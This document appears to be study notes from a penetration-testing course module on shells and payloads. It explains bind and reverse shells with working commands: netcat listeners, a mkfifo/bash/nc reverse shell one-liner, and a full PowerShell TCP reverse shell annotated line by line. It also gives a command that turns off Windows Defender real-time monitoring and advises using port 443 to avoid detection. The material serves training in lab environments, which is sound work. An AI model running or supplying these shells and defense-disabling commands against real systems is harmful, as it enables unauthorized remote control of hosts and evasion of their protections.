- [Shells \& Payloads](#shells--payloads)
  - [Intro](#intro)
  - [Shell Basics](#shell-basics)
    - [Bind Shells](#bind-shells)
      - [Using Netcat](#using-netcat)
      - [Bind Shell Example](#bind-shell-example)
    - [Reverse Shells](#reverse-shells)
      - [Reverse Shell Example](#reverse-shell-example)
  - [Payloads](#payloads)
    - [Intro](#intro-1)
      - [Netcat/Bash Reverse Shell One Liner](#netcatbash-reverse-shell-one-liner)
      - [PowerShell One Liner](#powershell-one-liner)

---

# Shells & Payloads

## Intro

A shell is a program that provides a computer user with an interface to input instructions into the system and view text output. As pentesters and information security professionals, a shell is often the result of exploiting a vuln or bypassing security measures to gain interactive access to a host.

Establishing a shell also allows you to maintain persistence on the system, giving you more time to work. It can make it easier to use your attack tools, exfiltrate data, gather, store and document all the details of your attack.

In this context, a payload means a code crafted with the intent to exploit a vuln on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

## Shell Basics

### Bind Shells

With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.

#### Using Netcat

Once connected to the target box with ssh, start a nc listener:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be your server, and the attack box will be your client. Once you hit enter, the listener is started and awaiting a connection from the client.

Back on the client, you will use nc to connect to the listener you started on the server.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Connecting was successful, also on the server:

```bash
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!   
```

That is not a proper shell though. It is just a nc TCP session you have established. You can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

Client:

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Server:

```bash
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

#### Bind Shell Example

On the server side, you will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands and conde in your payload will differ depending on the host OS you are delivering it to.

Back on the client, use nc to connect to the server now that a shell on the server is being served.

```bash
d41y@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

### Reverse Shells

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

You will often use this kind of shell as you come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving you a better chance of going undetected.

#### Reverse Shell Example

You can starta nc listener on your attack box.

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

This time around with your listener, you are binding it to a common port (443), this port is usually for HTTPS connections. You may want to use common ports like this because when you initiate the connection to your listener, you want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get various websites throughout the workday.

Netcat can be used to initiate the reverse shell on the Windows side, but you must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as your tool on the Windows side.

The question, you should ask yourself, should be 'What applications and shell languages are hosted on the target?'.

In this example, the following command is used:

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This PowerShell code can also be called shell code or your payload.

When hitting enter:

```ps
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

The Windows Defender AV software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system you are trying to connect with.

Disabling AV:

```ps
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempting to execute the code again leads to:

```bash
d41y@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

## Payloads

### Intro

In InfoSec, the payload is the command and/or code that exploits the vuln in an OS and/or application. The payload is the command and/or code that performs the malicious action from a defensive perspective.

#### Netcat/Bash Reverse Shell One Liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

rm -f /tmp/f;
# -> removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files; the semi-colon is used to execute the command sequentially
mkfifo /tmp/f; 
# -> makes a FIFO named pipe file at the location specified
cat /tmp/f |
# -> concatenates the FIFO named pipe file /tmp/f, the pipe connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe
/bin/bash -i 2>&1 | 
# -> specifies the command language interpreter using the -i option to ensure the shell is interactive; 2>&1 ensures the standard error data stream and standard output data stream are redirected to the command following the pipe
nc 10.10.14.12 7777 > /tmp/f
# -> uses nc to send a connection to your attack host; the output will be redirected to /tmp/f, serving the bash shell to your waiting nc listener
```

#### PowerShell One Liner

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -c
# -> executes powershell.exe with no profile and executes the command/script block contained in the quotes
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
# -> sets/evaluates the variable $client equal to the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object; the .NET framework object will connect with the TCP socket listed in the parantheses; the semi-colon ensures the commands & code are executed sequentially
$stream = $client.GetStream();
# -> sets/evaluates the variable $stream equal to the $client variable and the .NET framework method called GetStream that facilitates network communications; the semi-colon ensures the commands & code are executed sequentially
[byte[]]$bytes = 0..65535|%{0};
# -> creates a byte type array called $bytes that returns 65,535 zeros as the values in the array; this is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
# -> starts a while loop containing the $i variable set equal to the .NET framework Stream.Read method; the parameters: buffer, offset, and count are defined inside the parantheses of the method
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
# -> sets/evaluates the variable $data equal to an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream into ASCII
$sendback = (iex $data 2>&1 | Out-String );
# -> sets/evaluates the variable $sendback equal to the Invoke-Expression cmdlet against the $data variable, then redirects the standard error and standard output through a pipe to the Out-String cmdlet which converts input objects into strings; because Invoke-Expression is used, everything stored in $data will be run on the local computer
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
# -> sets/evaluates the variable $sendback2 equal to the $sendback variable plus the string PS plus path to the working directory plus the string '> '; this will result in the shell prompt being PS C:\workingdirectoryofmachine >
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
# -> sets/evaluates the variable $sendbyte equal to the ASCII encoded byte stream that will use a TCP client to initiate a PS session with a nc listener running on the sandbox
$client.Close() 
# -> this is the TcpClient.Close method that will be used when the connection is terminated
```

